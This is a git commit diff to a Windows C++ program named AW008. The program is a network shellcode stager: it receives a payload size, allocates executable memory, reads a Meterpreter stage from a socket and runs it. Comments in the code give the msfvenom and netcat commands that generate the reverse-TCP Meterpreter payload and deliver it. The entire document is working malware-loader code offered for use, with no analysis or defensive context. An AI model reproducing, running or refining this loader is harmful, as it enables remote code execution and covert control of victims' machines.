c264d100faf99c6c7e8368d80730ce8f03473af2
stickybitone <>
2025-11-15 16:30:43 +0100

    adjust AW008 to receive stage2 size prior to the payload

--- AW008/main.cpp
+++ AW008/main.cpp
@@ -6,10 +6,14 @@
 #pragma comment(lib, "ws2_32.lib")
 
 /*
-	msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= exitfunc=thread -f c > met.c
-	tail -n +2 met.c > met2.c
-	cat met2.c | tr -d "\"" | tr -d ";" | tr -d  '\n' | tee met3.c
-	echo -e `cat met3.c` | nc -v <listener ip> <listener port>
+	1.	msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= -f c 2>&1 | grep -i "payload size"
+		printf '%08x' 203864 
+		echo -e '\x00\x03\x1c\x58' | nc -v 127.0.0.1 443
+
+	2.  msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= -f c > met.c
+		tail -n +2 met.c > met2.c
+		cat met2.c | tr -d "\"" | tr -d ";" | tr -d  '\n' > met.c
+		echo -e `cat met.c` | nc -v <listener ip> <listener port>
 */
 
 int main(int argc, const char * argv[])
@@ -30,7 +34,8 @@ int main(int argc, const char * argv[])
 	ADDRINFOA* addressInfo = new ADDRINFOA();
 	SOCKET listenSocket = INVALID_SOCKET;
 	SOCKET clientSocket = INVALID_SOCKET;
-	int stage2 = 203846; //msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= -f c | grep bytes
+
+	char stage2bufbig[4] = {};
 	INT receivedBytes = 0;
 
 	socketHint->ai_family = AF_INET;
@@ -45,23 +50,44 @@ int main(int argc, const char * argv[])
 	bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
 	listen(listenSocket, SOMAXCONN);
 	
-	printf("[+] started listener on port %s\n", port);
+	printf("[+] starting listener on port %s\n", port);
 	
 	clientSocket = accept(listenSocket, NULL, NULL);
+	
+	receivedBytes = recv(clientSocket, stage2bufbig, 4, NULL);
 
-	LPVOID shellcode = VirtualAlloc(NULL, stage2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	char stage2buflittle[4] = {};
+	int position = 4;
+
+	//convert big- to little-endian
+	for (int i = 0; i < 4; i++)
+	{
+		stage2buflittle[i] = stage2bufbig[position - 1];
+		position--;
+	}
+
+	unsigned int stage2size = ( ((unsigned char)stage2buflittle[3] << 24) | ((unsigned char)stage2buflittle[2] << 16) | ((unsigned char)stage2buflittle[1] << 8) | (unsigned char)stage2buflittle[0]);
+
+	printf("[+] received stage2 size: [%d] bytes\n", stage2size);
+
+	LPVOID shellcode = VirtualAlloc(NULL, stage2size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	LPVOID bakAddr = shellcode;
+	
+	shutdown(clientSocket, 2);
+	clientSocket = accept(listenSocket, NULL, NULL);
+
+	printf("[*] waiting for the payload...\n");
 
 	int receivedAll = 0;
 	do
 	{
-		receivedBytes = recv(clientSocket, (char *)shellcode, stage2, NULL);
+		receivedBytes = recv(clientSocket, (char *)shellcode, stage2size, NULL);
 		receivedAll += receivedBytes;
 		printf("receivedBytes: %d\n", receivedBytes);
 		shellcode = ((char*)shellcode) + receivedBytes;
-		stage2 = stage2 - receivedBytes;
-		printf("left: %d\n", stage2);
-	} while (stage2 > 0);
+		stage2size = stage2size - receivedBytes;
+		printf("left: %d\n", stage2size);
+	} while (stage2size > 0);
 
 	((void(*)())bakAddr)();
 }
